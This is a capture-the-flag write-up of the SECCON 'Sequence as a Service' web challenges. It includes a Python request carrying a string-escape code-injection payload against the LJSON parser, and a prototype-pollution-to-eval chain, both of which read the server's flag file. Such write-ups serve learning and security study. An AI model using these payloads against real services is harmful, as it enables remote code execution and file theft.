## Sequence as a Service

**Authors**: [bazumo](https://twitter.com/bazumo), solved together with [Nspace](https://twitter.com/_MatteoRizzo)

**Tags**: web

**Points**: 205 (20 solves)

> I've heard that SaaS is very popular these days. So, I developed it, too.
> Note: It is possible to solve SaaS 2 even if you don't solve SaaS 1.

This challenge had two parts, we solved the second one first and then found a likely unintended solution for both parts.

In this challenge, we were given the source of a web application. In short, on the website we could select a sequence (i.e factorial numbers) and get the n'th number of the sequence. The sequence was described in LJSON and the stringified version of it was sent together with n to the server.

### LJSON

LJSON is a language that tries to extend JSON to support pure functions.
```javascript

// The object that provides the functions that we can use in LJSON
const lib = {
  "+": (x, y) => x + y,
  "-": (x, y) => x - y,
  "*": (x, y) => x * y,
  "/": (x, y) => x / y,
  ",": (x, y) => (x, y),
  "for": (l, r, f) => {
    for (let i = l; i < r; i++) {
      f(i);
    }
  },
  "set": (map, i, value) => {
    map[i] = value;
    return map[i];
  },
  "get": (map, i) => {
    return typeof i === "number" ? map[i] : null;
  },
  "self": () => lib,
};

// LJSON can be stringified like this, unlike JSON is supports lamda functions. 
const src = LJSON.stringify(($, n) =>
  $(",",
    $(",",
      $("set", $("self"), 0, 1),
      $("for",
        0,
        n,
        i => $("set",
          $("self"),
          0,
          $("*", $("get", $("self"), 0), 2),
        ),
      ),
    ),
    $("get", $("self"), 0),
  ),
);

// src == "(a,b)=>(a(\",\",a(\",\",a(\"set\",a(\"self\"),0,1),a(\"for\",0,b,(c)=>(a(\"set\",a(\"self\"),0,a(\"*\",a(\"get\",a(\"self\"),0),2))))),a(\"get\",a(\"self\"),0)))"


// The server would spawn a new node process and run our provided LJSON with the lib and our n.
LJSON.parseWithLib(lib, src)(n)
```

LJSON works by creating javascript code from the src that then gets executed via eval with lib as an argument.

Diffing the two challenges, we concluded that the solution must include the `self` function of lib as it was absent in the second part.

After trying different things and accidentally solving part 2 we started to question wether we shouldn't try to exploit the parser instead, which would solve both challenges and was probably not intended. Looking at the flag submission times of the other teams, there seemed to be quite a few who solved both challenges around the same time, indicating that their exploit targeted the parser.

After playing around with `"` and `\` characters, we quickly found that the parser didn't handle strings correctly and it was possible to eval whatever we wanted.

Our final payload was:

```python
import requests

r = requests.get('http://sequence-as-a-service-1.quals.seccon.jp:3000/api/getValue', params={
    'sequence': """(a,b)=>(a("set",{},"asd","\\\\\\"), fs = require('fs'), text = fs.readFileSync('/flag.txt','utf8'), text})) //"))""",
    'n': 3,
})

print(r.text)

```


FLAG: `SECCON{45deg_P4sc4l_g3Ner4tes_Fib0n4CCi_5eq!}`


### Sequence as a Service 2

SaaS 2 could be solved the same way, but we likely found the intended solution first. The code was almost identical to 1, except for `self` being gone and parsing and evaling 2 sequences instead of one.

The exploit goes as follows:

In the first sequence:
1. get `__proto__` of lib by using set (setting `__proto__` doesn't actually set it)
2. set `eval` of `lib.__proto__` to the number that [`toName` ](https://github.com/MaiaVictor/LJSON/blob/master/LJSON.js#L397) would convert to `eval` again.

```
(a,b)=>(a(",",a("get",{},"eval"),a("set",a("set",{},"__proto__","asdf"),"eval",193886)))
```

In the second squence:
1. use `eval` to execute code, the parser will allow it because it thinks `eval` is in the scope now because of the prototype pollution.

```
eval("let s = function(s){const fs = require('fs'); var text = fs.readFileSync('flag.txt','utf8'); return text }; s;")
```

FLAG: `SECCON{45deg_P4sc4l_g3Ner4tes_Fib0n4CCi_5eq!}`

### Conclusion

We thought the challenges was quite cool. Javascript is fun!